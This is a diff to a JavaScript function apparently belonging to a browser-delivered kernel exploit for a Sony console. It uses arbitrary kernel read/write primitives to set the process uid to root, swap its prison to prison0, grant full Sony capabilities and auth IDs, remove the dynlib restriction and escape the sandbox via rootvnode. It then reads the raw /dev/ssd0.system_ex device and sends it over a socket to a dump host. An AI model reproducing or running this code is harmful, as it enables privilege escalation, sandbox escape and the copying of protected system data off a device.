@@ -1402,10 +1402,10 @@ function stage3() {
 	 kernel_write4(get_kaddr(QAF_OFFSET), qaf_dword | 0x10300);
 	 debug_log("[+] qaf_flags_after: " + kernel_read4(get_kaddr(QAF_OFFSET)));
 
-	let utoken_flags =  kernel_read1(get_kaddr(UTF_OFFSET));
+	let utoken_flags =  kernel_read4(get_kaddr(UTF_OFFSET));
 	debug_log("[+] utoken_flags_before: " + utoken_flags);
-	 kernel_write1(get_kaddr(UTF_OFFSET), utoken_flags | 0x1);
-	 debug_log("[+] utoken_flags_after: " +  kernel_read1(get_kaddr(UTF_OFFSET)));
+	 kernel_write4(get_kaddr(UTF_OFFSET), utoken_flags | 0x1);
+	 debug_log("[+] utoken_flags_after: " +  kernel_read4(get_kaddr(UTF_OFFSET)));
 	debug_log("[+] enabled debug menu");
 
 	debug_log("cr_uid before: "  + kernel_read4(proc_ucred.add32(0x04)));
@@ -1426,7 +1426,7 @@ function stage3() {
 
 	// Escalate sony privs
 	 debug_log("cr_prison before: "  + kernel_read8(proc_ucred.add32(0x30)));
-	 kernel_write8(proc_ucred.add32(0x30), new int64(0x82D7B5B0, 0xFFFFFFFF)); // cr_prison = prison0 address
+	 kernel_write8(proc_ucred.add32(0x30), kernel_read8(new int64(0x81726AE0, 0xFFFFFFFF))); // cr_prison = got_prison0 address
 	 debug_log("cr_prison after: "  + kernel_read8(proc_ucred.add32(0x30)));
 	 debug_log("auth_id_before: "  + kernel_read8(proc_ucred.add32(0x58)));
 	 kernel_write8(proc_ucred.add32(0x58), new int64(0x00000010, 0x48000000)); // cr_sceAuthId
@@ -1437,9 +1437,12 @@ function stage3() {
 	 debug_log("cr_sceCaps 1 before: "  + kernel_read8(proc_ucred.add32(0x68)));
 	 kernel_write8(proc_ucred.add32(0x68), new int64(0xFFFFFFFF, 0xFFFFFFFF)); // cr_sceCaps[1]
 	 debug_log("cr_sceCaps 1 after: "  + kernel_read8(proc_ucred.add32(0x68)));
-	 debug_log("cr_sceAttr 0 before: "  + kernel_read1(proc_ucred.add32(0x83)));
-	 kernel_write1(proc_ucred.add32(0x83), 0x80);                              // cr_sceAttr[0]
-	 debug_log("cr_sceAttr 0 after: "  + kernel_read1(proc_ucred.add32(0x83)));
+	 debug_log("cr_sceAttr 0 before: "  + kernel_read4(proc_ucred.add32(0x80)));
+	 let attrs = kernel_read4(proc_ucred.add32(0x80));
+		attrs &= 0xFFFFFF;
+		attrs |= 0x80 << 24;
+		kernel_write4(proc_ucred.add32(0x80), attrs);                       // cr_sceAttr[0]
+	 debug_log("cr_sceAttr 0 after: "  + kernel_read4(proc_ucred.add32(0x80)));
 	// Remove dynlib restriction
     let proc_pdynlib_offset = proc.add32(0x3E8);
     let proc_pdynlib_addr = kernel_read8(proc_pdynlib_offset);
@@ -1453,6 +1456,8 @@ function stage3() {
 	let cur_uid = chain.syscall(0x018);
     debug_log("[+] we root now? uid=0x" + cur_uid);
 	
+	let is_in_sandbox = chain.syscall(0x249);
+	debug_log("[+] we escaped now? in sandbox: " + is_in_sandbox);
 	let rootvnode =  kernel_read8(get_kaddr(ROOTVNODE_OFFSET));
 	debug_log("fd_rdir before: "  + kernel_read8(proc_fd.add32(0x10)));
      kernel_write8(proc_fd.add32(0x10), rootvnode); // fd_rdir
@@ -1460,11 +1465,14 @@ function stage3() {
 	 debug_log("fd_jdir before: "  + kernel_read8(proc_fd.add32(0x18)));
      kernel_write8(proc_fd.add32(0x18), rootvnode); // fd_jdir
 	 debug_log("fd_rdir after: "  + kernel_read8(proc_fd.add32(0x18)));
-	let is_in_sandbox = chain.syscall(0x249);
-    debug_log("[+] we escaped now? in sandbox: " + is_in_sandbox);
+	is_in_sandbox = chain.syscall(0x249);
+    debug_log("[+] we escaped now? after in sandbox: " + is_in_sandbox);
   
+	let uid_is_set = chain.syscall(23, 0);
+	
+	alert("uid_is_set: 0x" + uid_is_set.low);
 
-  alert("prison3: " + kernel_read8(proc_ucred.add32(0x30)));
+  //alert("prison3: " + kernel_read8(proc_ucred.add32(0x30)));
 
 /*
   let dump_addr = get_kaddr(0x50F3C00);
@@ -1488,12 +1496,16 @@ function stage3() {
 
   // end dump code
 */
-
-
-  let buf = p.malloc(0x1000);
-  let fd = chain.syscall(0x005,"/dev/da0x12.crypt", 0);//open O_RDONLY
+  const OFFSET_ERRNO = 0x911A8;
+  
+  let stupid_string = p.stringify("/dev/ssd0.system_ex");
+  
+  let buf = p.malloc(0x4000);
+  let fd = chain.syscall(0x005,stupid_string, 0, 0);//open O_RDONLY
   if(fd.low == 0xffffffff){
     alert("failed to open, error -1");
+	let errno = p.read8(libKernelBase.add32(OFFSET_ERRNO));
+	alert("errno: " + errno);
   }
   else{
     alert("opened successfully, 0x" + fd);
@@ -1502,8 +1514,8 @@ function stage3() {
   let connect_res = chain.syscall(0x062, dump_sock_fd, dump_sock_addr_store, 0x10);//connect
   alert("connected dump sock? 0x" + connect_res);
   //814,78125 MiB
-  for (let pfn = 0; pfn <= 0x32EC8 ; pfn++) {
-      let read = chain.syscall(0x003, fd, buf, 0x1000);//read
+  for (let pfn = 0; ; pfn++) {
+      let read = chain.syscall(0x003, fd, buf, 0x4000);//read
     let write = chain.syscall(0x004, dump_sock_fd, buf, read);//write
     
   if(pfn == 0){  
